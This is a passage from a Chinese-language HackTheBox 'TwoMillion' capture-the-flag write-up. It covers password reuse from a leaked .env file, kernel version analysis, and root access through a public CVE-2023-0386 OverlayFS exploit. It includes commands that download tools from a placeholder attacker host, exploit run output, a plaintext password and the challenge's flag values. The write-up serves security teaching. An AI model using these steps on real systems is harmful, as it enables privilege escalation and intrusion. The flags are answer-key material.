# 目標端
script -qc /bin/bash /dev/null     # 或 python3 -c 'import pty; pty.spawn("/bin/bash")'
# 按 Ctrl+Z,回到你本機的 shell
stty raw -echo && fg                # 注意是 raw,不是 -raw(方向相反會斷線)
# 按一次 Enter
export TERM=xterm
```

---

### 19. 立足點之後:翻網站目錄

現在身分是 `www-data`(網站服務帳號),在 `/var/www/html`:

```bash
ls -la
```

```
www-data@2million:~/html$ ls -la
total 56
drwxr-xr-x 10 root root 4096 Nov 22 15:10 .
drwxr-xr-x  3 root root 4096 Jun  6  2023 ..
-rw-r--r--  1 root root   87 Jun  2  2023 .env
-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
drwxr-xr-x  5 root root 4096 Nov 22 15:10 VPN
drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
drwxr-xr-x  5 root root 4096 Jun  6  2023 css
drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
drwxr-xr-x  2 root root 4096 Jun  6  2023 images
-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
drwxr-xr-x  3 root root 4096 Jun  6  2023 js
drwxr-xr-x  2 root root 4096 Jun  6  2023 views
```

- **`.env`** 是很多專案存放設定值(資料庫帳密、金鑰)的隱藏檔。

```bash
cat .env
# DB_HOST=127.0.0.1
# DB_DATABASE=htb_prod
# DB_USERNAME=admin
# DB_PASSWORD=SuperDuperPass123
```

---

## 第四階段:SSH、使用者旗標、核心提權到 root

### 20. 密碼重複使用 → SSH
- `.env` 的 DB 密碼被拿去 SSH 登入 `admin@2million.htb`,成功。
- 在 `/home/admin` 讀到 `user.txt`(user flag 已取得)。

### 21. 線索:登入時的 "You have mail."
- 登入時顯示 `You have mail.`,讀 `/var/mail/admin`:

```
admin@2million:/var/mail$ cat admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2
Hey admin,
I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs
already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.
HTB Godfather
```
- 推論:管理員可能一直沒升級 OS,核心仍有該漏洞。

### 22. 核心資訊與工具取捨
- `uname -a`:

```
admin@2million:/var/mail$ uname -a
Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

  是上游(mainline)編的核心,不是 Ubuntu 自維護核心。
- linpeas(`wget http://<ATTACKER_IP>/linpeas.sh` → `chmod +x` → `./linpeas.sh`)列出:

```
CVE: CVE-2023-0386 | Name: OverlayFS suid smuggle | Match data: pkg=linux-kernel,ver>=5.11,ver<=6.2,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1 | Tags: ubuntu=22.04.1{kerne
```

  與信的線索對得上。但 linpeas 自己註明「not 100% reliable」,所以**只當候選,要手動驗證**。

#### Mainline 核心 vs Ubuntu 核心

兩者都是 Linux 核心,差在**誰編的、怎麼維護**。Ubuntu 核心是 Ubuntu 以某個上游版本為基底、加自己的修改並自行維護;mainline 核心直接照 kernel.org 上游原始碼編出來。

| | Ubuntu 官方核心 | Mainline(上游)核心 |
|---|---|---|
| 版本號例子 | `5.15.0-91-generic` | `5.15.70-051570-generic`(本題) |
| 版本號意義 | `5.15.0` 是**基底版本**,`-91` 是 Ubuntu 自己的修訂號 | `5.15.70` 是上游 5.15 系列第 70 次修補版;`051570` 是同一版本號的編碼 |
| 修補怎麼來 | 把安全修補 **backport** 進舊基底,`5.15.0` 不變 | 直接升到上游的新版本號 |
| 裝法 | 一般 `apt upgrade` | 另外下載 `.deb` 安裝(Ubuntu 有提供 mainline 編譯包) |

**為什麼差很多:backport。** 假設某漏洞在上游 `5.15.90` 修好:

- mainline 顯示 `5.15.70`,小於 `5.15.90`,**一定還沒修**,版本比對可靠。
- Ubuntu 顯示 `5.15.0-xx`,數字看起來很舊,但可能早已把修補放進 `-xx` 修訂版,**光看 `5.15.0` 會誤判成有漏洞**。

| 目標核心 | 版本比對可信度 | 還要做什麼 |
|---|---|---|
| Mainline | 高 | 版本在範圍內,基本可當有漏洞 |
| Ubuntu | 低 | 查 Ubuntu 的 CVE 追蹤、`apt changelog` 找該 CVE 在哪個修訂號修掉,或直接實測 |

**怎麼判斷目標是哪一種:**

1. `uname -r` 的格式:`5.15.0-91-generic` 是 Ubuntu;`5.15.70-051570-generic`(第三段是完整上游版本,後面接六位數)是 mainline。
2. `cat /proc/version` 的編譯者:本題 linpeas 顯示 `(kernel@sita) (gcc (Ubuntu 11.2.0-19ubuntu1) 11.2.0, ...)`,編譯者是 `kernel@...`,不是 Ubuntu 官方打包機器。據此**推斷**它是 Ubuntu 提供的 mainline 編譯包(未進一步驗證)。
3. 套件名:`dpkg -l | grep linux-image`。依命名慣例,Ubuntu 官方是 `linux-image-5.15.0-91-generic`,mainline 是 `linux-image-unsigned-5.15.70-051570-generic`(本題沒有實際查過)。

**對本題:** 目標是 `5.15.70` 的 mainline,編譯日 2022-09,早於 CVE-2023-0386 公開(2023-01),版本落在 NVD 範圍 `5.11 <= v <= 5.15.90` 內,所以版本比對可直接採信。同樣版本比對若遇到 Ubuntu 官方的 `5.15.0-xx`,就不能直接下結論。NVD 與 linpeas 的版本範圍通常是上游版本,對 mainline 很準,對 Ubuntu 只能當線索,這也是 linpeas 註明「not 100% reliable」的原因之一。

### 23. 讀 CPE 字串
```
cpe:2.3:o:debian:debian_linux:10.0:*:*:*:*:*:*:*
 固定  版本 類型  廠商    產品     版本   其餘全 * = 不限
```
- 類型:`o` 作業系統、`a` 應用程式、`h` 硬體。
- 這行是 Debian 10,與 Ubuntu 目標無關;要找廠商 `linux`、產品 `linux_kernel` 那行,版本範圍在旁邊的 From (including) / Up to (excluding) 欄位。

### 24. 手動驗證 CVE-2023-0386
**版本比對**:NVD 範圍 `5.11 <= v <= 5.15.90`,目標 `5.15.70`(逐段當整數比:70 < 90)→ 受影響。核心編譯日(2022-09)早於漏洞公開(2023-01),不可能含修補。

**漏洞原理**:
1. 用 FUSE 在使用者空間提供一個假的檔案系統,裡面放「屬於 root、帶 SUID」的檔案。
2. 用 OverlayFS 疊上去,核心複製檔案時沒有正確檢查擁有者與 SUID,於是把它原樣複製出來。
3. 掛載需要權限,所以先用 user namespace 在自己的空間裡扮演 root。
4. 結果:得到一個真正屬於 root 的 SUID 程式,執行即為 root。

**環境前提檢查(每項對應攻擊中的一個動作)**:

| 指令 | 結果 | 意義 |
|---|---|---|
| `cat /proc/sys/user/max_user_namespaces` | `15248` | >0,可建 user namespace |
| `ls -l /dev/fuse` | `crw-rw-rw-` | 所有人可用 FUSE |
| `which gcc make` | 兩者都在 | 可直接在目標編譯 |


```
admin@2million:/var/mail$   cat /proc/sys/user/max_user_namespaces
15248
admin@2million:/var/mail$   ls -l /dev/fuse
crw-rw-rw- 1 root root 10, 229 Nov 22 12:12 /dev/fuse
admin@2million:/var/mail$   which gcc make
/usr/bin/gcc
/usr/bin/make
```

### 25. 取得並執行 PoC
```bash
# Kali
git clone https://github.com/sxlmnwb/CVE-2023-0386
tar czf cve.tgz CVE-2023-0386
python3 -m http.server 8000
# 目標(admin)
cd /tmp && wget http://<ATTACKER_IP>:8000/cve.tgz
tar xzf cve.tgz && cd CVE-2023-0386 && make all
# 終端 1(目標)
./fuse ./ovlcap/lower ./gc        
# 終端 2(第二個 ssh 到目標)
./exp
```
- `make` 的 warning 不是 error;看最後有沒有產出 `fuse`、`exp`、`gc`。
- `./exp` 輸出 `[+] mount success`、`[+] exploit success!`。

#### `tar czf` / `tar xzf` 

`tar` 把多個檔案**打包**成一個檔案,或把打包檔**還原**。HTTP 一次只能傳一個檔案,PoC 是整個目錄,所以先打包傳過去,到目標機再還原。

```bash
tar czf cve.tgz CVE-2023-0386    # 打包
tar xzf cve.tgz                  # 還原
```

| 字母 | 意思 |
|---|---|
| `c` | **c**reate,建立打包檔 |
| `x` | e**x**tract,解開 |
| `z` | 用 g**z**ip 壓縮/解壓縮 |
| `f` | **f**ile,下一個參數是打包檔的檔名 |

兩個指令只差 `c` 和 `x`。`czf` 後面接 `cve.tgz`(要產生的檔名)和 `CVE-2023-0386`(要打包的目錄)。

- `f` 要放在選項最後,檔名緊接在後,因為 `f` 會吃掉下一個參數當檔名。`tar czf cve.tgz 目錄` 正確;`tar cfz cve.tgz 目錄` 會把 `cve.tgz` 當成給 `z` 的參數,出錯。
- 前面的 `-` 可省略:`tar czf` 等同 `tar -czf`。
- `.tgz` 與 `.tar.gz` 是同一種東西;副檔名只是慣例,真正決定壓縮的是 `z`。
- 其他常用:
  - `tar tzf cve.tgz`:`t` = 只列出內容不解開。解壓不信任的壓縮包前先看,留意有沒有 `../../` 開頭的路徑。
  - `tar xzf cve.tgz -C /tmp`:`-C` 指定解到哪個目錄。
  - `tar xf cve.tgz`:新版 GNU tar 解壓時會自動辨識壓縮格式,`z` 可省略(憑記憶,目標機的 tar 版本未驗證)。

**`make all` 輸出**:

```
admin@2million:/tmp$ tar xzf cve.tgz && cd CVE-2023-0386
admin@2million:/tmp/CVE-2023-0386$ make all
gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
fuse.c: In function ‘read_buf_callback’:
fuse.c:106:21: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘off_t’ {aka ‘long int’} [-Wformat=]
  106 |     printf("offset %d\n", off);
      |                    ~^     ~~~
      |                     |     |
      |                     int   off_t {aka long int}
      |                    %ld
fuse.c:107:19: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘size_t’ {aka ‘long unsigned int’} [-Wformat=]
  107 |     printf("size %d\n", size);
      |                  ~^     ~~~
      |                   |     |
      |                   int   size_t {aka long unsigned int}
      |                  %ld
fuse.c: In function ‘main’:
fuse.c:214:12: warning: implicit declaration of function ‘read’; did you mean ‘fread’? [-Wimplicit-function-declaration]
  214 |     while (read(fd, content + clen, 1) > 0)
      |            ^~~~
      |            fread
fuse.c:216:5: warning: implicit declaration of function ‘close’; did you mean ‘pclose’? [-Wimplicit-function-declaration]
  216 |     close(fd);
      |     ^~~~~
      |     pclose
fuse.c:221:5: warning: implicit declaration of function ‘rmdir’ [-Wimplicit-function-declaration]
  221 |     rmdir(mount_path);
      |     ^~~~~
/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/11/../../../x86_64-linux-gnu/libfuse.a(fuse.o): in function `fuse_new_common':
(.text+0xaf4e): warning: Using 'dlopen' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking
gcc -o exp exp.c -lcap
gcc -o gc getshell.c
```

**終端 1 `./fuse ./ovlcap/lower ./gc`**:

```
[+] len of gc: 0x3ee0
...(之後印出 callback 記錄)
offset 0
size 16384
path /file
[+] open_callback
/file
[+] open_callback
/file
[+] ioctl callback
path /file
cmd 0x80086601
```

**終端 2 `./exp`**:

```
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Nov 22 16:09 .
drwxrwxr-x 6 root   root     4096 Nov 22 16:09 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
root@2million:/tmp/CVE-2023-0386# ls
exp  exp.c  fuse  fuse.c  gc  getshell.c  Makefile  ovlcap  README.md  test
root@2million:/tmp/CVE-2023-0386# cd /root
root@2million:/root# ls
root.txt  snap  thank_you.json
```

---

## Flags

| Flag | 值 | 來源 |
|---|---|---|
| user.txt | `e8781e4fdbb212a6ba72d513fa969b2d` | `/home/admin/user.txt` |
| root.txt | `f20324b0e59dd6f884d14f3c9eec2abe` | `/root/root.txt` |

